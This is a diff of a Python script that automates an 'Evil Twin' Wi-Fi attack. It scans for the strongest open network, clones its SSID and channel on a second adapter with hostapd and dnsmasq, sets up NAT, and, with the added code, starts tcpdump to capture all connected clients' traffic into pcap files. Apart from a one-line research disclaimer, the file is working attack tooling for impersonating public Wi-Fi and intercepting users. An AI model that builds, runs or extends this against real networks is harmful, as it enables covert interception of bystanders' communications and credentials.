@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 """
-main.py
+main.py - Evil Twin Automation
 Author: YourName
 Date: 2025-xx-xx
 
@@ -12,6 +12,7 @@ Automates:
 4) Configuring a second interface (AP_INTERFACE) as Evil Twin
 5) Enabling NAT and packet forwarding
 6) Starting hostapd + dnsmasq
+7) Logging captured traffic
 
 DISCLAIMER: For authorized security research only.
 """
@@ -19,6 +20,7 @@ DISCLAIMER: For authorized security research only.
 import sys
 import time
 import os
+import logging
 
 from modules.net_scan import scan_for_open_networks, pick_strongest_open_network
 from modules.net_connect import connect_to_open_wifi
@@ -28,21 +30,18 @@ from modules.ap_config import (
     configure_ap_interface,
     start_hostapd_dnsmasq
 )
-from modules.nat_config import enable_nat
+from modules.net_config import enable_nat
 
 # -------------------------
 # Configuration Constants
 # -------------------------
 
-# If your Pi Zero has only built-in Wi-Fi, you can attempt both STA + AP on the same interface, 
-# but it's much easier to use two separate Wi-Fi adapters.
-STA_INTERFACE = "wlan0"   # The interface that connects to upstream open Wi-Fi
-AP_INTERFACE = "wlan1"    # The interface that creates the Evil Twin AP
+STA_INTERFACE = "wlan0"   # Interface that connects to upstream Wi-Fi
+AP_INTERFACE = "wlan1"    # Interface that creates the Evil Twin AP
 
-# hostapd + dnsmasq config
+# Paths
 HOSTAPD_CONFIG_TEMPLATE = "config_templates/hostapd.conf.template"
 DNSMASQ_CONFIG_TEMPLATE = "config_templates/dnsmasq.conf.template"
-
 HOSTAPD_CONFIG = "/etc/hostapd/hostapd.conf"
 DNSMASQ_CONFIG = "/etc/dnsmasq.conf"
 
@@ -50,74 +49,76 @@ AP_IP = "192.168.50.1"
 DHCP_RANGE_START = "192.168.50.2"
 DHCP_RANGE_END = "192.168.50.200"
 NETMASK = "255.255.255.0"
+LOG_DIR = "/var/log/evil_twin/"
+MAX_RETRIES = 3
+
+# Ensure log directory exists
+os.makedirs(LOG_DIR, exist_ok=True)
+
+logging.basicConfig(
+    filename=f"{LOG_DIR}main.log",
+    filemode='a',
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+
+def check_internet_connectivity(interface):
+    """ Checks if the interface has an assigned IP (i.e., connected to upstream Wi-Fi). """
+    try:
+        output = run_cmd(f"ip -4 addr show {interface} | grep inet")
+        return bool(output)  # Returns True if IP is assigned
+    except Exception as e:
+        logging.error(f"Failed to check connectivity: {e}")
+        return False
+
+def start_tcpdump(interface, output_dir=LOG_DIR):
+    """ Starts tcpdump to capture traffic from connected clients. """
+    capture_file = f"{output_dir}capture_{time.strftime('%Y%m%d_%H%M%S')}.pcap"
+    cmd = f"sudo tcpdump -i {interface} -w {capture_file} &"
+    run_cmd(cmd)
+    logging.info(f"Started packet capture: {capture_file}")
 
 def main():
-    # Must run as root
     if os.geteuid() != 0:
         print("[ERROR] This script must be run as root (sudo).")
         sys.exit(1)
 
-    print("[*] Scanning for open networks...")
-    networks = scan_for_open_networks(STA_INTERFACE)
-    if not networks:
-        print("[WARN] No open networks found. Exiting.")
-        sys.exit(0)
+    attempt = 0
+    while attempt < MAX_RETRIES:
+        print("[*] Scanning for open networks...")
+        networks = scan_for_open_networks(STA_INTERFACE)
+        if not networks:
+            print("[WARN] No open networks found. Retrying...")
+            attempt += 1
+            time.sleep(10)
+            continue
 
-    strongest = pick_strongest_open_network(networks)
-    if not strongest:
-        print("[WARN] Could not pick a strongest open network. Exiting.")
-        sys.exit(0)
+        strongest = pick_strongest_open_network(networks)
+        if not strongest:
+            print("[WARN] No viable open network detected. Retrying...")
+            attempt += 1
+            time.sleep(10)
+            continue
 
-    ssid = strongest["ssid"]
-    signal = strongest["signal"]
-    channel = strongest["channel"]  # We'll clone the real AP's channel if possible
+        ssid, channel = strongest["ssid"], strongest["channel"]
+        print(f"[INFO] Attempting to connect to: '{ssid}' (Channel {channel})")
 
-    print(f"[INFO] Found strongest open network: '{ssid}' (Signal: {signal}), Channel: {channel}")
+        if connect_to_open_wifi(ssid, STA_INTERFACE):
+            break  # Successful connection
 
-    print("[*] Connecting to upstream open Wi-Fi...")
-    success = connect_to_open_wifi(ssid, STA_INTERFACE)
-    if not success:
-        print("[ERROR] Could not connect to the open network. Exiting.")
+        attempt += 1
+        time.sleep(10)
+
+    if not check_internet_connectivity(STA_INTERFACE):
+        print("[ERROR] No internet connectivity. Exiting.")
         sys.exit(1)
 
-    # Wait a moment for DHCP to get an IP from the upstream AP
-    time.sleep(5)
-
-    # Set up the Evil Twin
-    print(f"[INFO] Setting up Evil Twin with SSID '{ssid}' on channel {channel} using interface {AP_INTERFACE}...")
-    
-    # 1) Configure AP interface
     configure_ap_interface(AP_INTERFACE, AP_IP)
-
-    # 2) Write hostapd config
-    write_hostapd_config(
-        template_path=HOSTAPD_CONFIG_TEMPLATE,
-        output_path=HOSTAPD_CONFIG,
-        ap_interface=AP_INTERFACE,
-        cloned_ssid=ssid,
-        channel=channel
-    )
-
-    # 3) Write dnsmasq config
-    write_dnsmasq_config(
-        template_path=DNSMASQ_CONFIG_TEMPLATE,
-        output_path=DNSMASQ_CONFIG,
-        ap_interface=AP_INTERFACE,
-        ap_ip=AP_IP,
-        dhcp_range_start=DHCP_RANGE_START,
-        dhcp_range_end=DHCP_RANGE_END,
-        netmask=NETMASK
-    )
-
-    # 4) Start AP services
+    write_hostapd_config(HOSTAPD_CONFIG_TEMPLATE, HOSTAPD_CONFIG, AP_INTERFACE, ssid, channel)
+    write_dnsmasq_config(DNSMASQ_CONFIG_TEMPLATE, DNSMASQ_CONFIG, AP_INTERFACE, AP_IP, DHCP_RANGE_START, DHCP_RANGE_END, NETMASK)
     start_hostapd_dnsmasq()
-
-    # 5) Enable NAT
-    enable_nat(sta_iface=STA_INTERFACE, ap_iface=AP_INTERFACE)
-
-    print(f"[+] Evil Twin setup complete. Cloned SSID: '{ssid}' on interface '{AP_INTERFACE}'")
-    print("    Connected upstream via", STA_INTERFACE)
-    print("    Press Ctrl+C to stop or run your MITM tools as desired.")
+    enable_nat(STA_INTERFACE, AP_INTERFACE)
+    start_tcpdump(AP_INTERFACE)
 
 if __name__ == "__main__":
     main()
